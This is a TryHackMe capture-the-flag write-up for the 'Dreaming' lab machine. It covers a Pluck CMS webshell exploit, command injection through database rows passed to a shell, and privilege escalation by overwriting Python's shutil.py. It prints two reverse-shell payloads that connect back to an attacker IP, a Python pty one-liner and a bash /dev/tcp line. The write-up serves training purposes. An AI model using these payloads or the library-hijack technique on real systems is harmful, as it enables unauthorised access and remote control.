---
title: Dreaming (THM)
image: /assets/writeups/damn.jpeg
description: Write-up of Dreaming Machine 
date: 2023-11-24
categories: [tryhackme]
tags: [tryhackme, thm, writeup, easy, machine, linux, code-injection, path-manipulation]
author: trace
---

## Reconnaissance

We start with the nmap scan and see the following ports which are open

![[nmapscan.png]](https://i.imgur.com/CpHTNiT.png)

nothing too interesting for now so we run directory bruteforce in order to find something

![[gobuster.png]](https://i.imgur.com/oaDZmeC.png)

and as you can see we do get to see something interesting here `/app` seems kinda interesting to me so we visit that web directory

and it's the pluck cms version 4.7.13

![[pluck.png]](https://i.imgur.com/LpbN4Mp.png)

further we see it asks for the password and upon trying some default creds `password` was the right password so we get a login successful on this

from here on i further start to enumerate this cms and looking for the exploit for this specific version and exploitDB fortunately has one 

![[exploit.png]](https://i.imgur.com/pg1ayL3.png)

so we prepare the payload and run the exploit on this vulnerable cms
and it successfully upload the webshell, 

![[uploadedwebshell.png]](https://i.imgur.com/vu2YwiC.png)

## Foothold (User1)

So upon visiting that webshell we get a revshell to our machine of that webshell and get the `www-user`

![[Screenshot_2023-11-24_15-12-51.png]](https://i.imgur.com/DivQXpN.png)

and now we look for low hanging fruits and potential to get a user so we could get our first flag
and after quite a while of doing some manual enumeration, we find lucien password found **/opt/test.py** 
and can login into SSH with it and get our first flag

![[lucianuser.png]](https://i.imgur.com/h8BTpHk.png)


## Foothold (User2)

from the past enumeration i saw one more script in the `/opt` directory which was owned user `death`.
and lucian can execute  `getDreams.py`  as death user without a password, but we cannot read it.

![[privescloop1.png]](https://i.imgur.com/BjX0bQ3.png)

so now comes the code reviewing part lol which was super easy here we see a mysql connection, but the credentials are redacted

````python
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
````

So it goes like: 
1. **MySQL Credentials:** The code defines three variables, `DB_USER`, `DB_PASS`, and `DB_NAME`, to store the MySQL credentials. These credentials are used to connect to the MySQL database.
    
2. `getDreams()` Function: The `getDreams()` function is the main part of the code. It handles the process of connecting to the MySQL database, fetching data from the `dreams` table, and echoing the dreamer and dream information to the console.
    
    a. **Connecting to MySQL:** The `try-except-finally` block is used to handle any errors that might occur during the database connection or query execution. The `connect()` method of the `mysql.connector` library is used to establish a connection to the MySQL database using the provided credentials.
    
    b. **Executing SQL Query:** A cursor object is created using the `connection.cursor()` method. This cursor object is used to execute SQL queries against the database. The `query` variable contains the SQL query to fetch the `dreamer` and `dream` columns from the `dreams` table. The `cursor.execute(query)` method is used to execute the query.
    
    c. **Fetching Dreamer and Dream Information:** The `cursor.fetchall()` method is used to fetch all the rows from the result set of the executed query. Each row contains a tuple of the `dreamer` and `dream` values.
    
    d. **Echoing Dreamer and Dream Information:** If there are no dreams found in the database, an error message is printed. Otherwise, the code loops through the fetched dream information and constructs a command using the `subprocess` library. The command is used to echo the dreamer and dream information to the console.
    
    e. **Closing Cursor and Connection:** Finally, the cursor and connection objects are closed using the `cursor.close()` and `connection.close()` methods, respectively. This ensures that the connection resources are properly released.
    
3. **Calling `getDreams()` Function:** The `getDreams()` function is called at the end of the code to execute the process of fetching and echoing dream information.
   
so we can clearly see command execution happening here

````python
command = f"echo {dreamer} + {dream}"
````

the variables `dreamer` and `dream` come from the mysql connection, so we need to connect to it someway.
now we do more enumeration and finally i see the .bash_history was getting refferred to `/dev/null` so we can read the .bash_histroy
and you can clearly see that is here where the information from getDreams are being retrieved.

![[lucianpass.png]](https://i.imgur.com/fsPFgth.png)

since lucien can insert into table “dreams”, we can insert a payload to get us a reverse shell.

so we create a bash script file that returns a python reverse shell to be executed 
````python
export RHOST="10.9.142.204";export RPORT=7777;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
````

so now what we do is inset into `dreams` table the python payload we have created  

![[valuesinserted.png]](https://i.imgur.com/I8BSWuI.png)

and execute `getDreams.py` as death user to get a reverseshell as `death` user.

````bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
````

and We get the `death` user

![[Screenshot_2023-11-24_16-39-48.png]](https://i.imgur.com/mHoEh4E.png)

now enuemating `morpheus` user's directory we see quite a few interesting things

![[morpheushome.png]](https://i.imgur.com/Burg34H.png)

## Root (User3)

so once i cat that script we can see it is import shutil from somewhere

````bash
death@dreaming:/home/morpheus$ cat restore.py 
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
````

so now we try to grep the `shutil` and we find it here `/usr/lib/python3.8/shutil.py `
reviewing the code and checking for perms we can see it is ran as morpheus user which is our last and final user(root). and we have edit permissions to it

so we put our reverse shell in the `shutil.py`

```python
echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/10.9.142.204/7777 0>&1'\")" > /usr/lib/python3.8/shutil.py
````

And we get the shell after few seconds

![[root.png]](https://i.imgur.com/4hkOVm1.png)

![[rootflag.png]](https://i.imgur.com/hNzfGe3.png)
